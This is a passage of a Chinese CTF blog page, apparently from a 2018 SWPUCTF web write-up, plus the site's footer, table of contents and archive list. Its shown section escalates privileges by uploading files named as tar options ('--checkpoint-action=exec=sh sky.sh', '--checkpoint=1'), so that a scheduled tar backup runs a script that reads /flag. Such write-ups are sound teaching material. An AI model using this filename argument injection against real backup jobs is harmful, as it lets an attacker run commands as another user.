class="string">"上传目录下的所有文件备份成功!&lt;br /&gt;"</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"备份文件名: z.tar.gz"</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"未上传文件，无法备份！"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<h3 id="提权与getflag"><a href="#提权与getflag" class="headerlink" title="提权与getflag"></a>提权与getflag</h3><p>后面想到的只能是提权了，看代码好像毫无什么明显问题<br>随后搜到这样一篇文章<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/qq_27446553/article/details/80943097</span><br></pre></td></tr></table></figure></p>
+<p>文章中，利用root的定时备份，成功反弹了root的shell，那么同理<br>这里我们的题目用flag用户进行备份，我们只要按照他的步骤，即可让flag用户帮我们执行sky.sh<br>于是利用上传，进行3个文件上传，文件名分别为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sky.sh</span><br><span class="line">--checkpoint-action=exec=sh sky.sh</span><br><span class="line">--checkpoint=1</span><br></pre></td></tr></table></figure></p>
+<p>sky.sh的内容为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /flag | base64</span><br></pre></td></tr></table></figure></p>
+<p>然后全部上传完毕，进行备份<br><img src="/images/2018-12-18-18-47-45.png" alt=""><br>即可得到flag:<code>swpuctf{xss_!_tar_exec_instr3st1ng}</code></p>
+
+    </article>
+    <!-- reward  -->
+    <div style='text-align:center;margin:100px auto auto auto;'>点击赞赏二维码，您的支持将鼓励我继续创作！</div>
+    <a class="fancy-link" href="/intro/alipay.png" alt="" data-fancybox="group" data-caption=""><img style='width:30%;margin:auto 50px auto 50px;' src="/intro/alipay.png" alt=""></a>
+    <a class="fancy-link" href="/intro/wechat.jpg" alt="" data-fancybox="group" data-caption=""><img style='width:30%;margin:auto 50px auto 50px;' src="/intro/wechat.jpg" alt=""></a>
+    <!-- license  -->
+    
+    <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href= "/2018/11/24/2018安恒杯11月月赛writeup/" title= "2018安恒杯11月月赛writeup">
+                    <div class="prevTitle">2018安恒杯11月月赛writeup</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
+    
+    
+    <!-- partial('_partial/comment/changyan') -->
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:skysec@aliyun.com" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/skyofkinglove" class="iconfont-archer github" target="_blank" title=github></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+            
+                <a href="/atom.xml" class="iconfont-archer rss" target="_blank" title=rss></a>
+            
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- 不蒜子  -->
+    
+    <div class="busuanzi-container">
+    
+     
+    <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+    
+    </div>
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#种子爆破"><span class="toc-number">1.</span> <span class="toc-text">种子爆破</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Bypass-RCE"><span class="toc-number">2.</span> <span class="toc-text">Bypass RCE</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Injection"><span class="toc-number"></span> <span class="toc-text">Injection ???</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#信息搜集"><span class="toc-number">1.</span> <span class="toc-text">信息搜集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#注入"><span class="toc-number">2.</span> <span class="toc-text">注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#getflag"><span class="toc-number">3.</span> <span class="toc-text">getflag</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#皇家线上赌场"><span class="toc-number"></span> <span class="toc-text">皇家线上赌场</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#信息搜集-1"><span class="toc-number">1.</span> <span class="toc-text">信息搜集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#源码读取"><span class="toc-number">2.</span> <span class="toc-text">源码读取</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#session伪造"><span class="toc-number">3.</span> <span class="toc-text">session伪造</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#格式化字符串攻击"><span class="toc-number">4.</span> <span class="toc-text">格式化字符串攻击</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SimplePHP"><span class="toc-number"></span> <span class="toc-text">SimplePHP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#信息搜集-2"><span class="toc-number">1.</span> <span class="toc-text">信息搜集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#反序列化"><span class="toc-number">2.</span> <span class="toc-text">反序列化</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp编写"><span class="toc-number">3.</span> <span class="toc-text">exp编写</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#getflag-1"><span class="toc-number">4.</span> <span class="toc-text">getflag</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#有趣的邮箱注册"><span class="toc-number"></span> <span class="toc-text">有趣的邮箱注册</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#信息搜集-3"><span class="toc-number">1.</span> <span class="toc-text">信息搜集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XSS"><span class="toc-number">2.</span> <span class="toc-text">XSS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RCE"><span class="toc-number">3.</span> <span class="toc-text">RCE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#信息再次发掘"><span class="toc-number">4.</span> <span class="toc-text">信息再次发掘</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#提权与getflag"><span class="toc-number">5.</span> <span class="toc-text">提权与getflag</span></a></li></ol>
+    </div>
+    
+    <div class="back-top iconfont-archer">&#xe639;</div>
+    <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-panel-archives">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 155
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+    
+    
+    
+    <div class="archive-year"> 2018 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/17</span><a class="archive-post-title" href= "/2018/12/17/2018SWPUCTF-Web/" >2018SWPUCTF-Web</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/24</span><a class="archive-post-title" href= "/2018/11/24/2018安恒杯11月月赛writeup/" >2018安恒杯11月月赛writeup</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/17</span><a class="archive-post-title" href= "/2018/11/17/当中国剩余定理邂逅RSA/" >当中国剩余定理邂逅RSA</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/17</span><a class="archive-post-title" href= "/2018/11/17/2018-Xctf Final&LCTF-Bestphp/" >2018-Xctf Final&LCTF-Bestphp</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/16</span><a class="archive-post-title" href= "/2018/11/16/EIS-2018-web/" >EIS-2018-web</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/12</span><a class="archive-post-title" href= "/2018/11/12/2018-HCTF-Web-Writeup/" >2018 HCTF Web Writeup</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/12</span><a class="archive-post-title" href= "/2018/11/12/Artificial-Intelligence-Review/" >Artificial Intelligence Review</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/04</span><a class="archive-post-title" href= "/2018/11/04/2018上海大学生信息安全竞赛-web/" >2018上海大学生信息安全竞赛-web</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/29</span><a class="archive-post-title" href= "/2018/10/29/Symmetric-block-ciphers-Summary-DES-AES/" >Symmetric block ciphers Summary - DES & AES</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/13</span><a class="archive-post-title" href= "/2018/10/13/2018护网杯-web-writeup/" >2018护网杯-web-writeup</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/24</span><a class="archive-post-title" href= "/2018/09/24/2018安恒杯-9月月赛Writeup/" >2018安恒杯-9月月赛Writeup</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/17</span><a class="archive-post-title" href= "/2018/09/17/2018-noxCTF-Crypto-RSA/" >2018-noxCTF-Crypto-RSA</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/17</span><a class="archive-post-title" href= "/2018/09/17/Crypto-RSA-公钥攻击小结/" >Crypto-RSA-公钥攻击小结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/15</span><a class="archive-post-title" href= "/2018/09/15/浅析RSA-Padding-Attack/" >浅析RSA Padding Attack</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/13</span><a class="archive-post-title" href= "/2018/09/13/Crypto-RSA多等式攻击总结/" >Crypto-RSA多等式攻击总结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/10</span><a class="archive-post-title" href= "/2018/09/10/Pwnhub-Crypto-韩国欧巴/" >Pwnhub-Crypto-韩国欧巴</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/25</span><a class="archive-post-title" href= "/2018/08/25/2018安恒8月赛Writeup/" >2018安恒8月赛Writeup</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/25</span><a class="archive-post-title" href= "/2018/08/25/RSA之拒绝套路-2/" >RSA之拒绝套路(2)</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/24</span><a class="archive-post-title" href= "/2018/08/24/Crypto之击破多层加密/" >Crypto之击破多层加密</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/24</span><a class="archive-post-title" href= "/2018/08/24/RSA之拒绝套路(1)/" >RSA之拒绝套路(1)</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/23</span><a class="archive-post-title" href= "/2018/08/23/从一道Crypto题目认识z3/" >从一道Crypto题目认识z3</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/20</span><a class="archive-post-title" href= "/2018/08/20/2018WhiteHat-writeup/" >2018WhiteHat-writeup</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/18</span><a class="archive-post-title" href= "/2018/08/18/浅析xml之xinclude-xslt/" >浅析xml之xinclude & xslt</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
